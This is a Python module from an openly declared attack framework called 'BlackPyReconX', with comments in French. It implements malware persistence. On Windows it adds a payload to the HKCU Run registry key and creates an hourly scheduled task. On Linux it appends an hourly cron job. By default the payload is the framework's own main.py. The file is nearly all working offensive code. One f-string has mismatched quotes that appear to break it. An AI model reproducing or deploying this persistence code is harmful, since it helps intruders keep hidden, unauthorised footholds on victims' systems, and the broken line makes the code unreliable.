# BlackPyReconX - Un framework d'attaque complet
# Copyright (C) 2025 Hermann KEKE
#
# Ce programme est un logiciel libre ; vous pouvez le redistribuer et/ou le
# modifier selon les termes de la Licence publique générale GNU telle que
# publiée par la Free Software Foundation ; soit la version 3 de la Licence,
# soit (à votre choix) toute version ultérieure.
#
# Ce programme est distribué dans l'espoir qu'il sera utile,
# mais SANS AUCUNE GARANTIE ; sans même la garantie implicite de
# QUALITÉ MARCHANDE ou d'ADÉQUATION À UN USAGE PARTICULIER. Voir la
# Licence publique générale GNU pour plus de détails.
#
# Vous devriez avoir reçu une copie de la Licence publique générale GNU
# avec ce programme. Si non, voir <https://www.gnu.org/licenses/>.

import os
import platform
import subprocess
import sys

# --- PERSISTANCE SUR WINDOWS ---

def add_to_registry_windows(payload_path, key_name="BlackPyReconX"):
    """Ajoute le payload au registre pour un lancement au démarrage."""
    if platform.system() != "Windows":
        print("[-] Cette fonction est uniquement pour Windows.")
        return False
    
    # Importer winreg uniquement sur Windows
    import winreg

    try:
        # Chemin vers la clé de démarrage de l'utilisateur courant
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        # Ouvrir la clé avec les droits d'écriture
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        # Définir la valeur : le nom de la clé et le chemin vers l'exécutable
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, f'"{payload_path}"')
        # Fermer la clé
        winreg.CloseKey(registry_key)
        print(f"[+] Persistance ajoutée au registre avec succès. Clé : {key_name}")
        return True
    except Exception as e:
        print(f"[-] Erreur lors de l'ajout au registre : {e}")
        return False

def create_scheduled_task_windows(payload_path, task_name="BlackPyReconXTask"):
    """Crée une tâche planifiée pour exécuter le payload toutes les heures."""
    if platform.system() != "Windows":
        return False
    
    try:
        # Commande pour créer une tâche qui se lance toutes les 60 minutes
        command = f'schtasks /create /tn "{task_name}" /tr "\"{payload_path}\"" /sc hourly /f'
        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[+] Tâche planifiée '{task_name}' créée avec succès.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Erreur lors de la création de la tâche planifiée : {e.stderr.decode()}")
        return False

# --- PERSISTANCE SUR LINUX ---

def add_to_cron_linux(payload_path):
    """Ajoute une tâche cron pour exécuter le payload toutes les heures."""
    if platform.system() != "Linux":
        print("[-] Cette fonction est uniquement pour Linux.")
        return False

    try:
        # Commande cron pour une exécution toutes les heures
        cron_job = f"0 * * * * \"{payload_path}\""
        # Utiliser une astuce pour ajouter la ligne seulement si elle n'existe pas déjà
        command = f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -'
        subprocess.run(command, shell=True, check=True)
        print("[+] Tâche cron ajoutée avec succès.")
        return True
    except Exception as e:
        print(f"[-] Erreur lors de l'ajout de la tâche cron : {e}")
        return False

# --- FONCTION PRINCIPALE DU MODULE ---
def run(payload_path=None):
    """Tente d'établir la persistance sur le système."""
    print("[+] Lancement du module de persistance...")

    # Si aucun payload n'est spécifié, on utilise le script principal du projet
    if payload_path is None:
        # On suppose que main.py est à la racine du projet
        base_dir = os.path.dirname(os.path.dirname(__file__))
        # Le payload est l'exécution de main.py avec l'interpréteur python actuel
        payload_path = f'"{sys.executable}" "{os.path.join(base_dir, 'main.py')}''
    
    print(f"[*] Payload de persistance : {payload_path}")

    os_type = platform.system()
    print(f"[*] Système d'exploitation détecté : {os_type}")

    if os_type == "Windows":
        add_to_registry_windows(payload_path)
        create_scheduled_task_windows(payload_path)
    elif os_type == "Linux":
        add_to_cron_linux(payload_path)
    else:
        print(f"[-] La persistance n'est pas supportée pour le système : {os_type}")

if __name__ == '__main__':
    run()
